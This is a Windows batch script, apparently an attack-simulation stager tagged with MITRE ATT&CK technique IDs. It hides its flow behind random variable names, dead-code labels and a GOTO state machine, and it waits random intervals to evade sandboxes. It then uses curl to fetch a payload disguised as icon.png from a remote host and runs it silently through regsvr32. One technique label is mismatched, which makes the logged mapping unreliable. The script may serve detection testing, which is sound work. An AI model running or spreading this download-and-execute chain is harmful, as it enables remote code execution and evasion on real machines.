@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_* placeholder assignments (random-named SET variables)
SET xkqwp=%APPDATA%\10937\c7e499a5
SET mnbvc=ae753d0c.txt
SET zxcvb=https://10.0.0.49/stage/2/icon.png?10937-7
SET lkjhg=BALAM-S2BO
SET asdfg=10937
SET qwert=7
SET poiuy=%PUBLIC%\\macula-simulations.log
SET tyuio=https://10.0.0.49

REM Cache timestamp
SET tsvar=!DATE!/!TIME!

REM Random delay seed
SET /A rdel=%RANDOM% %% 20 + 10
timeout /t !rdel! /nobreak >nul

REM Goto state machine start
SET state=0
GOTO dispatch_xkqwp

:junk_1
REM Dead code - never reached
EXIT /B 0

:dispatch_xkqwp
IF %state%==0 GOTO init_heartbeat_mnbvc
IF %state%==17 GOTO delay_after_heartbeat_zxcvb
IF %state%==42 GOTO chdir_plkmj
IF %state%==99 GOTO execute_lolbin_tyuio
IF %state%==123 GOTO final_log_poiuy
GOTO END

:dead_2
REM Dead code
SET dummy=nothing
GOTO END

:init_heartbeat_mnbvc
REM Begin heartbeat fetch
echo [!tsvar!][DEBUG][!lkjhg!][!asdfg!]: heartbeat_start>> "!poiuy!" 2>nul
curl -k -s -o "!xkqwp!\!mnbvc!" "!zxcvb!"
IF ERRORLEVEL 1 (
    set hb_result=FAIL
) ELSE (
    set hb_result=OK
)
echo [!tsvar!][DEBUG][!lkjhg!][!asdfg!]: heartbeat_complete>> "!poiuy!" 2>nul
SET state=17
GOTO dispatch_xkqwp

:junk_3
REM More dead code
GOTO END

:delay_after_heartbeat_zxcvb
REM Delay between steps (mix)
timeout /t 7 /nobreak >nul
ping -n 3 127.0.0.1 >nul
for /l %%i in (1,1,5) do timeout /t 1 /nobreak >nul
SET /A extra_delay=%RANDOM% %% 15 + 5
timeout /t !extra_delay! /nobreak >nul
SET state=42
GOTO dispatch_xkqwp

:dead_4
EXIT /B 0

:chdir_plkmj
REM Change to output directory
echo [!tsvar!][DEBUG][!lkjhg!][!asdfg!]: chdir_start>> "!poiuy!" 2>nul
cd /d "!xkqwp!" >nul 2>&1
IF ERRORLEVEL 1 (
    set chdir_result=1
) ELSE (
    set chdir_result=0
)
echo [!tsvar!][DEBUG][!lkjhg!][!asdfg!]: chdir_result=!chdir_result!>> "!poiuy!" 2>nul
SET state=99
GOTO dispatch_xkqwp

:junk_5
REM Dead code
GOTO END

:execute_lolbin_tyuio
REM Invoke DLL via regsvr32 with indirection obfuscation
echo [!tsvar!][DEBUG][!lkjhg!][!asdfg!]: rundll32_start>> "!poiuy!" 2>nul

REM Obfuscate LOLBIN name and argument via variable indirection
SET lolbin_cmd=regsvr32.exe
SET lolbin_arg=/s
CALL SET full_cmd=%%lolbin_cmd%% %%lolbin_arg%% "!mnbvc!"

REM Execute with error handling
!full_cmd!
IF ERRORLEVEL 1 (
    set exec_result=FAIL
    set exec_error=errorcode=!ERRORLEVEL!
) ELSE (
    set exec_result=OK
    set exec_error=
)
echo [!tsvar!][DEBUG][!lkjhg!][!asdfg!]: rundll32_complete>> "!poiuy!" 2>nul
SET state=123
GOTO dispatch_xkqwp

:dead_6
REM Dead code
GOTO END

:final_log_poiuy
REM Log TTP results
echo [!tsvar!][TTP][!lkjhg!][!asdfg!]: T1217^|System Binary Proxy Execution=!exec_result!:!exec_error!>> "!poiuy!" 2>nul
echo [!tsvar!][TTP][!lkjhg!][!asdfg!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!poiuy!" 2>nul
echo [!tsvar!][TTP][!lkjhg!][!asdfg!]: T1027^|Obfuscated Files or Information=OK:>> "!poiuy!" 2>nul
GOTO END

:END
EXIT /B 0